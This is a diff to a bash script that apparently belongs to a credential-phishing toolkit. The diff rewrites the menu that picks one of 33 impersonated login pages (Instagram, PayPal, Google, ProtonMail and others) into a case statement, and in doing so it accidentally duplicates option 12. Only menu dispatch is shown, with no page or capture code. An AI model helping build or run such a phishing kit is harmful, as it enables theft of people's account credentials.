@@ -44,141 +44,43 @@ printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      
 
 printf "                                                \e[1;94m UPGRADED BY: @suljot_gjoka\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
-
-
-if [[ $option == 1 ]]; then
-server="instagram"
-start
-
-elif [[ $option == 2 ]]; then
-server="facebook"
-start
-elif [[ $option == 3 ]]; then
-server="snapchat"
-start
-elif [[ $option == 4 ]]; then
-server="twitter"
-start
-elif [[ $option == 5 ]]; then
-server="github"
-start
-elif [[ $option == 6 ]]; then
-server="google"
-start
-
-elif [[ $option == 7 ]]; then
-server="spotify"
-start
-
-elif [[ $option == 8 ]]; then
-server="netflix"
-start
-
-elif [[ $option == 9 ]]; then
-server="paypal"
-start
-
-elif [[ $option == 10 ]]; then
-server="origin"
-start
-
-elif [[ $option == 11 ]]; then
-server="steam"
-start
-
-elif [[ $option == 12 ]]; then
-server="yahoo"
-start
-
-elif [[ $option == 13 ]]; then
-server="linkedin"
-start
-
-elif [[ $option == 14 ]]; then
-server="protonmail"
-start
-
-elif [[ $option == 15 ]]; then
-server="wordpress"
-start
-
-elif [[ $option == 16 ]]; then
-server="microsoft"
-start
-
-elif [[ $option == 17 ]]; then
-server="instafollowers"
-start
-
-elif [[ $option == 18 ]]; then
-server="shopping"
-start
-
-elif [[ $option == 19 ]]; then
-server="pinterest"
-start
-
-elif [[ $option == 20 ]]; then
-server="cryptocurrency"
-start
-
-elif [[ $option == 21 ]]; then
-server="verizon"
-start
-
-elif [[ $option == 22 ]]; then
-server="dropbox"
-start
-
-elif [[ $option == 23 ]]; then
-server="adobe"
-start
-
-elif [[ $option == 24 ]]; then
-server="shopify"
-start
-
-elif [[ $option == 25 ]]; then
-server="messenger"
-start
-
-elif [[ $option == 26 ]]; then
-server="gitlab"
-start
-
-elif [[ $option == 27 ]]; then
-server="twitch"
-start
-
-elif [[ $option == 28 ]]; then
-server="myspace"
-start
-
-elif [[ $option == 29 ]]; then
-server="badoo"
-start
-
-elif [[ $option == 30 ]]; then
-server="vk"
-start
-
-elif [[ $option == 31 ]]; then
-server="yandex"
-start
-
-elif [[ $option == 32 ]]; then
-server="devianart"
-start
-
-elif [[ $option == 33 ]]; then
-server="create"
-createpage
-start
-
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-menu
-fi
+#Code updated by Kayo Oliveira 2019/05/11
+case $option in
+	1) server=instagram && start ;;
+	2) server=facebook && start ;;
+	3) server=snapchat && start ;;
+	4) server=twitter && start ;;
+	5) server=github && start ;;
+	6) server=google && start ;;
+	7) server=spotify && start ;;
+	8) server=netflix && start ;;
+	9) server=paypal && start ;;
+	10) server=origin && start ;;
+	11) server=steam && start ;;
+	12) server=yahoo && start ;;
+	12) server=linkedin && start ;;
+	14) server=protonmail && start ;;
+	15) server=wordpress && start ;;
+	16) server=microsoft && start ;;
+	17) server=instafollowers && start ;;
+	18) server=shopping && start ;;
+	19) server=pinterest && start ;;
+	20) server=cryptocurrency && start ;;
+	21) server=verizon && start ;;
+	22) server=dropbox && start ;;
+	23) server=adobe && start ;;
+	24) server=shopify && start ;;
+	25) server=messenger && start ;;
+	26) server=gitlab && start ;;
+	27) server=twitch && start ;;
+	28) server=myspace && start ;;
+	29) server=badoo && start ;;
+	30) server=vk && start ;;
+	31) server=yandex && start ;;
+	32) server=devianart && start ;;
+	33) server=create && createpage && start ;;
+	*) menu ;;
+esac
 }
 
 stop() {
@@ -405,4 +307,3 @@ done
 banner
 dependencies
 menu
-
